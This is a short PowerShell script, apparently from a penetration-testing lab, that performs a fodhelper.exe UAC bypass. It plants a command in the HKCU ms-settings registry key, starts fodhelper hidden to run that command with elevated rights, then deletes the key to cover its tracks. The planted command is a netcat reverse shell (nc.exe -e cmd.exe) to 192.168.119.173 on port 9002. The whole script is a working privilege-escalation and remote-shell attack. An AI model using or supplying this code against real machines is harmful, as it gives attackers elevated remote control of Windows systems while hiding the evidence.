#This UAC bypass tries to execute your command with elevated privileges using fodhelper.exe

$evilcommand = "C:\zon\nc.exe 192.168.119.173 9002 -e cmd.exe"

#Adding all the reistry required with the command.

New-Item "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Force
New-ItemProperty -Path "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Name "DelegateExecute" -Value "" -Force
Set-ItemProperty -Path "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Name "(default)" -Value $evilcommand -Force

#Starts the fodhelper process to execute the command.

Start-Process "C:\Windows\System32\fodhelper.exe" -WindowStyle Hidden

#Cleaning up the mess created.
Remove-Item "HKCU:\Software\Classes\ms-settings\" -Recurse -Force
